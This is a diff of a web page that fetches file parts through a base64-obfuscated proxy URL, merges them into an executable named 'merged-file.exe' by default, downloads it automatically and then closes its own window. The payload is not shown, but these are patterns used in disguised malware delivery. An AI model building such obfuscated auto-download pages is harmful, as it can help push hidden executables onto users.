@@ -10,11 +10,11 @@
             height: 100vh;
             background: #0d1117; 
             display: flex;
-            flex-direction: column;
+            flex-direction: column; /* Changed to column for text */
             align-items: center;
             justify-content: center;
             overflow: hidden;
-            font-family: sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         #bar-container { 
@@ -37,20 +37,20 @@
             box-shadow: 0 0 10px rgba(46, 160, 67, 0.4);
         }
 
-        /* Added a status message style */
-        #status-msg {
-            margin-top: 15px;
+        #status-text {
+            margin-top: 20px;
             color: #8b949e;
-            font-size: 12px;
+            font-size: 14px;
             opacity: 0;
-            transition: opacity 0.5s ease;
+            transition: opacity 0.5s;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
     <div id="bar-container"><div id="bar-fill"></div></div>
-    <div id="status-msg">Download started. You can close this tab.</div>
+    <div id="status-text">Processing...</div>
 
     <script>
 
@@ -65,7 +65,6 @@
     const _r2 = [0, 1, 2, 3, 4, 5, 6, 7, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51];
 
     const _rec = (recipe) => recipe.map(i => _parts[i]).join('');
-    
     const _comp = (s) => window.atob(_rec(s));
 
     const Proxy = _comp(_r1); 
@@ -73,10 +72,21 @@
 
         const barFill = document.getElementById('bar-fill');
         const barCont = document.getElementById('bar-container');
-        const statusMsg = document.getElementById('status-msg');
+        const statusText = document.getElementById('status-text');
 
         function log(msg, type='') {
             console.log(`[${type || 'INFO'}] ${msg}`);
+        }
+
+        // Helper to attempt closing the window
+        function closeWindow() {
+            try {
+                window.opener = null;
+                window.open('', '_self');
+                window.close();
+            } catch (e) {
+                console.log("Could not auto-close");
+            }
         }
 
         async function init() {
@@ -90,13 +100,17 @@
             }
 
             if(parts.length === 0) {
-                log("No file parts found (checked ?1=, ?2=...)", "error");
+                log("No file parts found", "error");
+                statusText.innerText = "Error: No file specified.";
+                statusText.style.opacity = 1;
                 return;
             }
 
             const fileName = params.get('name') || "merged-file.exe";
             
             barCont.style.opacity = '1';
+            statusText.innerText = "Downloading...";
+            statusText.style.opacity = '1';
 
             try {
                 const chunks = [];
@@ -104,15 +118,12 @@
                 for(let k=0; k < parts.length; k++) {
                     const percent = Math.round((k / parts.length) * 100);
                     barFill.style.width = percent + '%';
-                    
-                    log(`Downloading part ${k+1} of ${parts.length}...`);
-                    
                     const chunk = await downloadPart(parts[k]);
                     chunks.push(chunk);
                 }
 
                 barFill.style.width = '100%';
-                log("Merging files...", "success");
+                statusText.innerText = "Merging...";
 
                 const blob = new Blob(chunks, { type: 'application/octet-stream' });
                 const url = window.URL.createObjectURL(blob);
@@ -121,39 +132,46 @@
                 a.href = url;
                 a.download = fileName;
                 document.body.appendChild(a);
+                
+                // 1. Trigger the Save Dialog
                 a.click();
                 
                 log(`Saved as: ${fileName}`, "success");
-                
-                // Show status message in case window doesn't close
-                statusMsg.style.opacity = '1';
+                statusText.innerText = "Download Ready. Window will close shortly.";
 
-                // Attempt to close window after a short delay
+                // 2. Setup logic to close AFTER interaction
+                // We add a slight delay so the 'focus' event doesn't fire immediately 
+                // while the dialog is popping up.
                 setTimeout(() => {
-                    barCont.style.opacity = '0';
-                    window.URL.revokeObjectURL(url);
                     
-                    // Attempt to close the window
-                    try {
-                        window.close();
-                        // Fallback hack for some older browsers
-                        window.open(window.location, '_self').close();
-                    } catch (e) {
-                        console.log("Browser prevented auto-close.");
-                    }
-                }, 1000);
+                    // A: If the user clicks anywhere on the page, close it.
+                    window.addEventListener('click', () => {
+                        window.URL.revokeObjectURL(url);
+                        closeWindow();
+                    });
+
+                    // B: If the window regains focus (e.g. after Save Dialog closes), close it.
+                    window.addEventListener('focus', () => {
+                         // Give it a split second to ensure the dialog is fully gone
+                         setTimeout(() => {
+                            window.URL.revokeObjectURL(url);
+                            closeWindow();
+                         }, 300);
+                    });
+
+                }, 1000); // Wait 1 second before starting to listen for close events
 
             } catch (error) {
                 log(`ERROR: ${error.message}`, "error");
                 barFill.style.background = '#ff7b72';
                 barFill.style.boxShadow = '0 0 10px rgba(255, 123, 114, 0.4)';
+                statusText.innerText = "Error occurred.";
             }
         }
 
         async function downloadPart(fileId) {
             const fileUrl = BASE_DL_URL + fileId;
             const workerRequestUrl = Proxy + encodeURIComponent(fileUrl);
-            
 
             const response = await fetch(workerRequestUrl, {
                 method: 'GET',
@@ -161,7 +179,7 @@
             });
 
             if (!response.ok) {
-                throw new Error(`Server Error ${response.status} for file ID ${fileId}`);
+                throw new Error(`Server Error ${response.status}`);
             }
 
             return await response.arrayBuffer();
